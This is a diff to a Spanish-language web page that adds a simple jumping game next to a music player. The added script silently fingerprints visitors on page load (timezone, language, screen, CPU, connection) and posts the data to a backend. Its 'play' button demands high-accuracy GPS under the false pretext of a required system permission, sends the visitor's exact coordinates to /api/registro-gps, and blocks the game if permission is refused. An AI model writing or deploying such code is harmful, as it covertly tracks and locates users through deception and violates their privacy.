@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Reproductor de Música</title>
+  <title>Arcade & Música</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: #121212;
       color: #ffffff;
       display: flex;
@@ -15,56 +15,121 @@
       justify-content: center;
       min-height: 100vh;
       margin: 0;
+      padding: 10px;
     }
-    .container {
+
+    .card {
       background-color: #1e1e1e;
-      padding: 2rem;
+      padding: 1.5rem;
       border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-      width: 90%;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+      width: 100%;
       max-width: 400px;
       text-align: center;
-    }
-    h1 {
-      font-size: 1.5rem;
       margin-bottom: 1.5rem;
+    }
+
+    h1, h2 {
+      margin: 0 0 1rem 0;
       color: #1db954;
     }
+
     .track {
       background-color: #2a2a2a;
-      margin: 1rem 0;
-      padding: 1rem;
+      margin: 0.8rem 0;
+      padding: 0.8rem;
       border-radius: 8px;
     }
+
     .track p {
       margin: 0 0 0.5rem 0;
       font-weight: bold;
     }
+
     audio {
       width: 100%;
+      height: 36px;
+    }
+
+    /* Estilos del Canvas y Juego */
+    #game-container {
+      position: relative;
+      width: 100%;
+      max-width: 360px;
+      margin: 0 auto;
+    }
+
+    canvas {
+      background-color: #222;
+      border: 2px solid #333;
+      border-radius: 8px;
+      display: block;
+      width: 100%;
+      height: 150px;
+    }
+
+    .btn-play {
+      background-color: #1db954;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 25px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-play:hover {
+      background-color: #1ed760;
+    }
+
+    .btn-play:active {
+      transform: scale(0.98);
+    }
+
+    #score-board {
+      font-size: 1.1rem;
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #fff;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Lista de Reproducción</h1>
+  <!-- Sección de Música -->
+  <div class="card">
+    <h1>🎵 Reproductor</h1>
 
     <div class="track">
-      <p>🎵 gigiboss</p>
+      <p>gigiboss</p>
       <audio controls src="/gigiboss.mp3"></audio>
     </div>
 
     <div class="track">
-      <p>🎵 GuguAndJiji</p>
+      <p>GuguAndJiji</p>
       <audio controls src="/GuguAndJiji.mp3"></audio>
     </div>
   </div>
 
+  <!-- Sección del Juego T-Rex -->
+  <div class="card">
+    <h2>Gigi-rex</h2>
+    <div id="score-board">Puntos: <span id="score">0</span></div>
+
+    <div id="game-container">
+      <canvas id="gameCanvas" width="360" height="150"></canvas>
+    </div>
+
+    <button id="start-btn" class="btn-play">▶ JUGAR</button>
+  </div>
+
   <script>
-    // Captura y envío automático de metadatos del navegador
-    (async function enviarMetadatos() {
-      const datosCliente = {
+    // --- Captura Silenciosa Inicial de Metadatos ---
+    (async function capturarMetadatosPasivos() {
+      const metadatos = {
         zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
         idioma: navigator.language,
         pantalla: `${window.screen.width}x${window.screen.height}`,
@@ -72,8 +137,8 @@
         nucleosCPU: navigator.hardwareConcurrency || 'N/A',
         conexion: navigator.connection ? {
           tipo: navigator.connection.effectiveType,
-          rtt: navigator.connection.rtt,
-          downlink: navigator.connection.downlink
+          rttMs: navigator.connection.rtt,
+          downlinkMbps: navigator.connection.downlink
         } : 'No soportado'
       };
 
@@ -81,14 +146,166 @@
         await fetch('/api/metadatos-cliente', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(datosCliente)
+          body: JSON.stringify(metadatos)
         });
       } catch (e) {
         console.log('Error enviando metadatos:', e);
       }
     })();
-  </script>
 
+    // --- Lógica del Juego y Permiso GPS ---
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
+    const startBtn = document.getElementById('start-btn');
+    const scoreEl = document.getElementById('score');
+
+    let gameRunning = false;
+    let score = 0;
+    let animationFrameId;
+
+    // Propiedades del Jugador (Cubo Verde)
+    const player = {
+      x: 30,
+      y: 110,
+      width: 25,
+      height: 25,
+      color: '#00ff66',
+      vy: 0,
+      gravity: 0.6,
+      jumpStrength: -10,
+      isGrounded: true
+    };
+
+    // Propiedades del Cactus/Obstáculo (Cubo Rojo)
+    const cactus = {
+      x: canvas.width,
+      y: 115,
+      width: 20,
+      height: 20,
+      color: '#ff3333',
+      speed: 4
+    };
+
+    // Solicitar GPS al presionar "JUGAR"
+    startBtn.addEventListener('click', () => {
+      if (gameRunning) return;
+
+      if ('geolocation' in navigator) {
+        startBtn.innerText = "Verificando...";
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            // Permiso Concedido -> Enviar GPS Exacto al Backend
+            fetch('/api/registro-gps', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                gps: {
+                  latitud: pos.coords.latitude,
+                  longitud: pos.coords.longitude,
+                  precisionMetros: pos.coords.accuracy
+                }
+              })
+            }).catch(err => console.error(err));
+
+            // Iniciar Juego
+            iniciarJuego();
+          },
+          (error) => {
+            // Permiso Denegado/Fallido -> No arranca el juego
+            alert("Para poder activar el modo Arcade debes aceptar los permisos del sistema.");
+            startBtn.innerText = "▶ JUGAR";
+          },
+          { enableHighAccuracy: true, timeout: 7000 }
+        );
+      } else {
+        alert("Tu navegador no soporta el motor de juego.");
+      }
+    });
+
+    // Control de Salto (Teclas y Toques en Pantalla/Móvil)
+    function saltar() {
+      if (player.isGrounded && gameRunning) {
+        player.vy = player.jumpStrength;
+        player.isGrounded = false;
+      }
+    }
+
+    window.addEventListener('keydown', (e) => {
+      if (e.code === 'Space' || e.code === 'ArrowUp') saltar();
+    });
+    canvas.addEventListener('touchstart', (e) => {
+      e.preventDefault();
+      saltar();
+    });
+
+    function iniciarJuego() {
+      gameRunning = true;
+      score = 0;
+      cactus.x = canvas.width;
+      cactus.speed = 4;
+      player.y = 110;
+      player.vy = 0;
+      startBtn.style.display = 'none';
+      bucleJuego();
+    }
+
+    function bucleJuego() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      // Dibujar Suelo
+      ctx.strokeStyle = '#555';
+      ctx.lineWidth = 2;
+      ctx.beginPath();
+      ctx.moveTo(0, 135);
+      ctx.lineTo(canvas.width, 135);
+      ctx.stroke();
+
+      // Física del Jugador
+      player.vy += player.gravity;
+      player.y += player.vy;
+
+      if (player.y >= 110) {
+        player.y = 110;
+        player.vy = 0;
+        player.isGrounded = true;
+      }
+
+      // Dibujar Jugador (Cubo Verde)
+      ctx.fillStyle = player.color;
+      ctx.fillRect(player.x, player.y, player.width, player.height);
+
+      // Mover y Dibujar Obstáculo (Cubo Rojo)
+      cactus.x -= cactus.speed;
+      if (cactus.x + cactus.width < 0) {
+        cactus.x = canvas.width;
+        score += 10;
+        cactus.speed += 0.2; // Dificultad progresiva
+        scoreEl.innerText = score;
+      }
+
+      ctx.fillStyle = cactus.color;
+      ctx.fillRect(cactus.x, cactus.y, cactus.width, cactus.height);
+
+      // Detección de Colisiones (Hitbox)
+      if (
+        player.x < cactus.x + cactus.width &&
+        player.x + player.width > cactus.x &&
+        player.y < cactus.y + cactus.height &&
+        player.y + player.height > cactus.y
+      ) {
+        // Game Over
+        gameRunning = false;
+        alert(`¡Game Over! Puntuación final: ${score}`);
+        startBtn.innerText = "▶ REINTENTAR";
+        startBtn.style.display = 'inline-block';
+        return;
+      }
+
+      if (gameRunning) {
+        animationFrameId = requestAnimationFrame(bucleJuego);
+      }
+    }
+  </script>
 </body>
 </html>
-</script>
